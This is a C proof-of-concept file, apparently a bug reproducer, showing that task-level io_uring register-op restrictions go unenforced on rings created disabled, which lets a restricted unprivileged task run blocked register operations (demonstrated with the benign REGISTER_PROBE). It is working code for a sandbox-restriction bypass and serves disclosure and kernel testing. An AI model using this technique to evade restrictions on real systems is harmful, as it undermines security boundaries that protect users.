// SPDX-License-Identifier: MIT
/*
 * Task-level io_uring register-op restrictions (Linux 7.0+) are not
 * enforced on rings created with IORING_SETUP_R_DISABLED until the ring
 * is enabled. A task restricted to IORING_REGISTER_ENABLE_RINGS can still
 * run any register op on such a ring.
 *
 * Build: cc -o repro repro.c   Run as an unprivileged user.
 */
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>

struct task_restriction {
	__u16 flags;
	__u16 nr_res;
	__u32 resv[3];
	struct io_uring_restriction res[1];
};

static int ring_setup(unsigned flags)
{
	struct io_uring_params p;

	memset(&p, 0, sizeof(p));
	p.flags = flags;
	return syscall(__NR_io_uring_setup, 4, &p);
}

static int reg(int fd, unsigned op, void *arg, unsigned nr)
{
	return syscall(__NR_io_uring_register, fd, op, arg, nr) < 0 ? -errno : 0;
}

static int probe(int fd)
{
	static char buf[sizeof(struct io_uring_probe) +
			256 * sizeof(struct io_uring_probe_op)];

	memset(buf, 0, sizeof(buf));
	return reg(fd, IORING_REGISTER_PROBE, buf, 256);
}

int main(void)
{
	struct task_restriction tr = {
		.nr_res = 1,
		.res[0] = {
			.opcode = IORING_RESTRICTION_REGISTER_OP,
			.register_op = IORING_REGISTER_ENABLE_RINGS,
		},
	};
	int fd, ret;

	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
		return perror("prctl"), 2;
	ret = reg(-1, IORING_REGISTER_RESTRICTIONS, &tr, 1);
	if (ret)
		return fprintf(stderr, "task restrictions: %d\n", ret), 2;

	fd = ring_setup(0);
	printf("normal ring:   REGISTER_PROBE = %d (expected -EACCES)\n", probe(fd));

	fd = ring_setup(IORING_SETUP_R_DISABLED);
	ret = probe(fd);
	printf("disabled ring: REGISTER_PROBE = %d (expected -EACCES)\n", ret);
	printf("ENABLE_RINGS = %d\n", reg(fd, IORING_REGISTER_ENABLE_RINGS, NULL, 0));
	printf("enabled ring:  REGISTER_PROBE = %d (expected -EACCES)\n", probe(fd));

	if (ret == 0) {
		printf("BYPASS: register op allowed on a disabled ring\n");
		return 1;
	}
	return 0;
}
